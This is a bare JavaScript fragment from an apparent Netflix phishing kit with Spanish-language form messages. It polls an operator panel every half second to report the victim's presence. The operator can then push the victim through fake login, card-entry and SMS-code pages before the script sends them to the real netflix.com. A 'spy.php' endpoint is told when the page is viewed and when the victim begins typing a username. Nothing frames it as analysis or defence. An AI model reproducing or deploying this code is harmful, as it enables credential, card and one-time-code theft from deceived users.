	<script>
	var targets = {1:"login.php", 
	2:"login.php?e=error", 3:"card.php", 4:"card.php?e=error",
	 5:"sms.php", 6:"sms.php?e=error", 7:"https://netflix.com"};
	clearRedirections();
	setInterval(function(){
	$.post("../panel/process/processor.php",
	{keepAlive:1, page:"LOGIN "} );
}, 500);
var redirect=0;
setInterval(function(){
	$.post("../panel/process/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 500);
function clearRedirections(){
	$.post("../panel/process/processor.php",
	{clearRedirection:1});
}
</script>
<script src="res/v.js"></script>
<script src="res/m.js"></script>
<script>
var submitbtn = $("#submitbtn");
$.validator.messages.required = "Por favor, completelo.";	
$("#loginform").validate({
	submitHandler:function(form){
		submitbtn.html("<div class='loader'></div>");
		 form.submit();
	}
});

$.post("spy.php",{loginview:1});
var c=0;
$("#user").keyup(function(){
	c++;if(c==1){
$.post("spy.php",{loging:1});
	}});
</script>
